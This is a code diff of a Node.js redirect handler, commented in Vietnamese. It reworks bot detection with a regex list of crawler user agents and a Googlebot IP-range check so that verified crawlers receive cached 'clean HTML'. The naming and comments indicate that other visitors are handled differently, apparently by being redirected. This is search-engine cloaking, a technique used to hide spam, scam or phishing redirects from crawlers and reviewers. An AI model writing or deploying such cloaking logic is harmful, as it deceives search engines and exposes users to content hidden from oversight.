@@ -1,7 +1,6 @@
 const path = require('path');
 const ipRangeCheck = require('ip-range-check');
 const fs = require('fs');
-const isBot = require('isbot');
 require('dotenv').config();
 
 // Cache file HTML tĩnh khi khởi động
@@ -36,7 +35,31 @@ const knownGoogleBotIPs = [
   '130.211.0.0/22',
 ];
 
-function isGoogleBotIP(userAgent, req) {
+function isGoogleBot(userAgent, req) {
+  const botPatterns = [
+    /googlebot/i,
+    /adsbot-google/i,
+    /mediapartners-google/i,
+    /apis-google/i,
+    /feedfetcher-google/i,
+    /google favicon/i,
+    /google web preview/i,
+    /google-read-aloud/i,
+    /duplexweb-google/i,
+    /google-speakr/i,
+    /bingbot/i,
+    /slurp/i,
+    /duckduckbot/i,
+    /baiduspider/i,
+    /yandexbot/i,
+    /sogou/i,
+    /exabot/i,
+    /facebot/i,
+    /ia_archiver/i
+  ];
+  const isBotUA = botPatterns.some((re) => re.test(userAgent));
+  if (!isBotUA) return false;
+  // Kiểm tra IP nếu là Googlebot
   if (/googlebot/i.test(userAgent)) {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
     if (!ipRangeCheck(ip, knownGoogleBotIPs)) {
@@ -58,8 +81,8 @@ exports.handleRedirect = async (req, res) => {
     return res.status(500).send('Server misconfiguration');
   }
 
-  // Nếu là bot (dùng isbot), riêng Googlebot kiểm tra thêm IP
-  if (isBot(ua) && isGoogleBotIP(ua, req)) {
+  // Nếu là bot (dùng regex), riêng Googlebot kiểm tra thêm IP
+  if (isGoogleBot(ua, req)) {
     console.log('🤖 Bot hợp lệ → trả HTML sạch');
     logRedirect(`Bot: UA=${ua} IP=${ip}`);
     return res.send(cachedHtml || 'Đang tải...');
